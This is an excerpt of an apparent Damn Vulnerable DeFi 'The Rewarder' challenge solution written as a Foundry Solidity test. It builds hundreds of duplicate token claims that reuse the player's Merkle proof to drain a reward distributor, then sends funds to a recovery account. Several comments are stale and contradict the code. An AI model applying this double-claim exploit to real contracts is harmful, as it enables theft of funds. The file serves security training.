...
contract TheRewarderChallenge is Test{
    ...
    uint256 constant NUMBER_OF_CLAIMS_DVT = 867;
    uint256 constant NUMBER_OF_CLAIMS_WETH = 853;
    uint256 constant NUMBER_OF_CLAIMS_TOTAL = NUMBER_OF_CLAIMS_DVT + NUMBER_OF_CLAIMS_WETH;
    uint256 constant PLAYER_DVT_CLAIM_AMOUNT = 11524763827831882;
    uint256 constant PLAYER_WETH_CLAIM_AMOUNT = 1171088749244340;
    uint256 constant PLAYER_DVT_ADDRESS_INDEX = 188;
    uint256 constant PLAYER_WETH_ADDRESS_INDEX = 188;
     ...
     */
    function test_theRewarderSolver() public checkSolvedByPlayer {
        // console.log("player's address: %s", player);

        IERC20[] memory tokensToClaim = new IERC20[](NUMBER_OF_CLAIMS_TOTAL);
        for (uint256 i = 0; i < NUMBER_OF_CLAIMS_TOTAL; i++) {
            // Player will claim both DVT and WETH
            if (i < NUMBER_OF_CLAIMS_DVT) {
                // First token is DVT
                tokensToClaim[i] = IERC20(address(dvt));
            } else {
                // Second token is WETH
        ...
        Claim[] memory claims = new Claim[](NUMBER_OF_CLAIMS_TOTAL);
        ...
        for (uint256 i = 0; i < NUMBER_OF_CLAIMS_TOTAL; i++) {
            ...
            if (i < NUMBER_OF_CLAIMS_DVT) {
                ...
                claims[i] = Claim({
                    ...
                    proof: merkle.getProof(dvtLeaves, PLAYER_DVT_ADDRESS_INDEX) // Alice's address is at index 2
                });
            } else {
                // Second token is WETH
                claims[i] = Claim({
                    ...
                    tokenIndex: i, // claim corresponds to second token in `tokensToClaim` array
                    proof: merkle.getProof(wethLeaves, PLAYER_WETH_ADDRESS_INDEX) // Alice's address is at index 2
                });
            }            
        ...
        // Player transfer all funds to recovery account
